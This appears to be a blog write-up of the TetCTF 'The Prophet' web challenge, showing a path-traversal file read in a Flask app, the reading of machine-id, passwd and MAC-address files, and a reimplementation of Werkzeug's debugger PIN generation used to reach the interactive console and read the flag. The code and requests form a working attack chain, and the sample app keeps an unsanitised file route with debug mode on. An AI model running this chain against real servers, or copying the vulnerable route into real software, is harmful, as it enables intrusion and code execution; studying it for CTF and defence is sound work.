---
layout: post
title: "The Prophet - TetCTF"
date: "2020-01-08 07:12"
category: writeup
tags: [ctf, writeup, python, flask, ACE]
---

This was a fun one. We start off with a web page and get a foothold with an
arbitrary file read vulnerability, and end it off with a Python Flask Arbitrary
Code Execution in the web debugger.

On the webpage, we are presented with a hyperlink with the text `Read some
oracle here`. Clicking the hyperlink brings us to 5 web pages
`/read/oracle/[1-5].txt`. One of them, `1.txt`, says the following:

> Flag is in random folder at /, but what is it name? Who know 🤷‍♂️ 
> Can you help me? (This is not brute/guess challenge...) !

We try to see if we can get to other files by changing the URL to something
else (try `0.txt`), and we get a Flask debugger error page. In it, we see the
directory the app lives in, `/home/web3_user/app.py`. Let's see what would
happen if we change the URL to that. We set the URL to `/read/app.py`. We get
the following Python code:

```python
from flask import Flask
from flask import render_template
import random

app = Flask(__name__)

@app.route('/')
def index():
	rand = str(random.randint(1, 5))
	return render_template('index.html', random=rand)

@app.route('/read/<path:filename>')
def read(filename=None):
	rand = str(random.randint(1, 5))

	try:
		content = open(filename, 'r').read()
	except:
		raise
	return render_template('file.html', filename=content, random=rand)

if __name__ == '__main__':
	app.run(host='0.0.0.0', port='7004', debug=True)
```

To read files with directory traversal, substitute your `/` with the URL
encoded equivalent `%2f`. Reading `/etc/passwd` would just be a get request to
`/read/..%2f..%2fetc%2fpasswd` (remember that we are in `/home/web3_user/`).

As you can see, debug mode is on. This means that whenever an error occurs, an
interactive console can be toggled and let you input code (a.k.a. Flask
debugger page mentioned above). The caveat is that it is secured with a PIN
that is only displayed in the `stdout` when you run the server. This PIN is not
generated randomly every time; rather, it uses a bunch of different
machine-specific pieces of information to generate a PIN. This is the
[function][gen-pin-fn] for generating a PIN. I have taken the liberty to remove
the part that checks the environment for a pin.

```python
def get_pin_and_cookie_name(app):
    """Given an application object this returns a semi-stable 9 digit pin
    code and a random key.  The hope is that this is stable between
    restarts to not make debugging particularly frustrating.  If the pin
    was forcefully disabled this returns `None`.
    Second item in the resulting tuple is the cookie name for remembering.
    """
    rv = None
    num = None

    modname = getattr(app, "__module__", app.__class__.__module__)

    try:
        # getuser imports the pwd module, which does not exist in Google
        # App Engine. It may also raise a KeyError if the UID does not
        # have a username, such as in Docker.
        username = getpass.getuser()
    except (ImportError, KeyError):
        username = None

    mod = sys.modules.get(modname)

    # This information only exists to make the cookie unique on the
    # computer, not as a security feature.
    probably_public_bits = [
        username,
        modname,
        getattr(app, "__name__", app.__class__.__name__),
        getattr(mod, "__file__", None),
    ]

    # This information is here to make it harder for an attacker to
    # guess the cookie name.  They are unlikely to be contained anywhere
    # within the unauthenticated debug page.
    private_bits = [str(uuid.getnode()), get_machine_id()]

    h = hashlib.md5()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, text_type):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")

    cookie_name = "__wzd" + h.hexdigest()[:20]

    # If we need to generate a pin we salt it a bit more so that we don't
    # end up with the same value and generate out 9 digits
    if num is None:
        h.update(b"pinsalt")
        num = ("%09d" % int(h.hexdigest(), 16))[:9]

    # Format the pincode in groups of digits for easier remembering if
    # we don't have a result yet.
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x : x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num

    return rv, cookie_name
```

Fix the import errors:

```python
from itertools import chain
import sys
import hashlib
```

You might also notice that the variable `text_type` is not defined anywhere.
Digging a bit deeper in the [source code][text_type-src] gives us `text_type =
str` if we are using Python 3 (which we are).

There is another function that is referenced: `get_machine_id`, which gets the
machine's ID, regardless of operating system. Using the exploit, we can read
the file `/etc/os-release` to see that we are on an Ubuntu system, so we check
the contents of `/etc/machine-id` and replace the function call with the string
`d4e6cb65d59544f3331ea0425dc555a1`.

We now need to know the username, modname, and whatever `uuid.getnode` returns.
The username is simple. We use the exploit to read `/etc/passwd` and see that
we are probably `web3_user`. If you call the function now and print the
`modname`, you see that it just says `flask.app`, so let's assume that it's the
same everywhere. This leaves `uuid.getnode`. We read the
[documentation][uuid-getnode] and see that it gets the hardware address (MAC
address) of the network interface. To do this, we first have to list out all
the current network interfaces by reading the file `/proc/net/dev`. We find the
ethernet interface `ens3` and read the file `/sys/class/net/ens3/address` to
get the hardware address `56:00:02:7a:23:ac`, and convert it into an integer,
and then to a string.

We are actually missing one thing. Within `get_pin_and_cookie_name` there is a
variable `probably_public_bits`. The last item may not be the same as the one
on the server, depending on the system you run python on. If we run the
function right now and print this variable, the last item would be something
similar to `/usr/*/python3.x/*-packages/flask/app.py`. If you would recall,
when we first ran into the error, it output
`/usr/local/lib/python3.5/dist-packages/flask/app.py`. So we simply replace the
call to `getattr` with the previous string, and call the function to get the
PIN. If it isn't obvious already, the parameter you call it with is the
`app.py` code you got earlier.

After getting the PIN, we have access to the Werkzeug debugger/interactive
console, and thus have ACE. We execute the following code to find the flag:

```python
>>> import os
>>> os.listdir('/')
['media', 'tmp', 'lib', 'swapfile', 'srv', 'usr', 'vmlinuz', 'opt',
'initrd.img.old', 'home', 'bin', 'boot', 'etc', 'lost+found', 'initrd.img',
'root', 'mnt', 'vmlinuz.old', 'dev', 'phao_san_pa_lay___1337', 'sys', 'proc',
'run', 'lib64', 'sbin', 'snap', 'var']
>>> os.listdir('/phao_san_pa_lay___1337')
['flagggg.txt']
>>> open('/phao_san_pa_lay___1337/flagggg.txt').read()
"TetCTF{Flask_Debug_LFI___Wuttt__RCE}\n\nPlease don't do any further action" +
"on the server, we knew the setup suck, but it's needed for the vulnerability\n"
```

[gen-pin-fn]: https://github.com/pallets/werkzeug/blob/71cf9902012338f8ee98338fa7bba50572606637/src/werkzeug/debug/__init__.py#L133
[uuid-getnode]: https://docs.python.org/3/library/uuid.html#uuid.getnode
[text_type-src]: https://github.com/pallets/werkzeug/blob/71cf9902012338f8ee98338fa7bba50572606637/src/werkzeug/_compat.py#L129
